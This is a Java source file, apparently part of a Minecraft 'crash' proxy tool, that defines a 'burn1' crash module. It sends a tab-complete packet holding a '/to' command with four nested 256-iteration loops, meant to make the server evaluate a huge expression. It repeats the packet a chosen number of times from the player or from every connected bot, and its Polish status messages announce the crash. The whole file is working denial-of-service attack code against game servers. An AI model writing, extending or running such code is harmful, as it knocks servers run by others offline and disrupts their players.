package net.avarioncode.proxy.system.crash.impl;

import net.avarioncode.proxy.mc.objects.Player;
import net.avarioncode.proxy.mc.packet.Packet;
import net.avarioncode.proxy.mc.packet.impl.client.play.ClientTabCompletePacket;
import net.avarioncode.proxy.system.crash.Crash;

import java.util.stream.IntStream;

public class CrashBurn1 extends Crash {

    private Packet packet;

    public CrashBurn1() {
        super("burn1");
    }

    @Override
    public void init() {

        this.packet = new ClientTabCompletePacket("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
    }

    @Override
    public void execute(String message, Player sender) {

        if (packet == null) {
            sender.sendChatMessage("&7Wystapil blad podczas wysylania pakietow!");
            return;
        }
        try {
            int time;
            int time2;
            final String[] args = message.split(" ");
            final int amount = Integer.parseInt(args[2]);
            if (sender.getBots().size() == 0) {
                time = (int) System.currentTimeMillis();
                sender.sendChatMessage("&7Rozpoczynam crashowanie &8(&fBURN1&8) (&fPLAYER&8)");
                IntStream.range(0, amount).forEach(i -> sender.getConnector().sendPacket(packet));
                time2 = (int) System.currentTimeMillis() - time;
                sender.sendChatMessage("&7Crashowanie zakonczone &8(&f" + time2 + "MS&8)");
            } else {
                time = (int) System.currentTimeMillis();
                sender.sendChatMessage("&7Rozpoczynam crashowanie &8(&fBURN1&8) (&fBOTS&8)");
                sender.getBots().forEach(b -> IntStream.range(0, amount).forEach(i -> b.getConnection().sendPacket(packet)));
                time2 = (int) System.currentTimeMillis() - time;
                sender.sendChatMessage("&7Crashowanie zakonczone &8(&f" + time2 + "MS&8)");
            }
        } catch (final Throwable t) {
            sender.sendChatMessage("&7Wystapil blad podczas crashowania! &8(&f" + t.getClass().getSimpleName() + "&8)");
        }
    }
}
